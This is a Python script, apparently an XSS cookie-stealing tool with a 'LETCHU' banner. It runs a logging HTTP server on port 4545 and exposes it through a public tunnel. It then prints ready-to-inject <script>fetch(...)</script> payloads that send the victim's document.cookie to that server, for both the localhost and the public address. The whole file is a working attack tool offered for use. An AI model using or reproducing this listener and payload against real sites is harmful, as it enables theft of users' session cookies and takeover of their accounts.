from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import publicurl
import time
import sys
import re

class RequestHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        """Handle GET requests"""
        parsed_url = urllib.parse.urlparse(self.path)
        query_params = urllib.parse.parse_qs(parsed_url.query)

        print("\n---- GET Request ----")
        print(f"Path: \033[32m{self.path}\033[0m")
        print(f"Headers:\n{self.headers}")
        print(f"Query Parameters: \033[31m{query_params}\033[0m")

        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"GET request received and logged.")

def strip_ansi_escape_sequences(text):
    ansi_escape = re.compile(r'\x1B[@-_][0-?]*[ -/]*[@-~]')
    return ansi_escape.sub('', text)

def home_logo():
    print("""
	$$\       $$$$$$$$\ $$$$$$$$\  $$$$$$\  $$\   $$\ $$\   $$\ 
	$$/|      $$  _____|\__$$  __|$$  __$$\ $$ |  $$ |$$ |  $$ |
	$$ |      $$ |         $$ |   $$ /  \__|$$ |  $$ |$$ |  $$ |
	$$ |      $$$$$\       $$ |   $$ |      $$$$$$$$ |$$ |  $$ |
	$$ |      $$  __|      $$ |   $$ |      $$  __$$ |$$ |  $$ |
	$$ |      $$ |         $$ |   $$ |  $$\ $$ |  $$ |$$ |  $$ |
	$$$$$$$$\ $$$$$$$$\    $$ |   \$$$$$$  |$$ |  $$ |\$$$$$$  |
	\________|\________|   \__|    \______/ \__|  \__| \______/
                                                            
                                                            
                                                            

    """)

def run(server_class=HTTPServer, handler_class=RequestHandler, port=4545):
    """Run the HTTP server"""
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    home_logo()
    print()
    print("localhost js query ::: \033[31m<script>fetch(`http://127.0.0.1:4545?cookies=${encodeURIComponent(document.cookie)}`);</script>\033[0m")
    publicurl.create_public_connection()
    time.sleep(7)
    k = publicurl.get_public_url()
    if k!="0":
        k=k.replace(" ","")
        k = strip_ansi_escape_sequences(k).strip()
        print(f"public js query ::: \033[31m<script>fetch(`"+k+"?cookies=${encodeURIComponent(document.cookie)}`);</script>\033[0m")
    print("\nServer running....")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("Exiting....")
        sys.exit()
    except Exception as e:
        print(e)

if __name__ == '__main__':
    run()
